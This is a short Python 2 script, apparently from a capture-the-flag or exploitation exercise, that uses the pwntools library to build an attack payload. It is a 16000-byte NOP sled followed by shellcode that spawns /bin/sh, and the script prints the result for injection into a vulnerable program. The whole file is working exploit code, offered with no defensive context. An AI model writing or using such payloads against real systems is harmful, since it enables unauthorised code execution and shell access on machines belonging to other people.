#!/usr/bin/env python
from pwn import *

payload = ''

# Add nopsled
nops = '\x90'*16000
payload += nops

# Assemble a shellcode from 'shellcraft' and append to payload
shellcode = asm(shellcraft.sh())
payload += shellcode

print payload
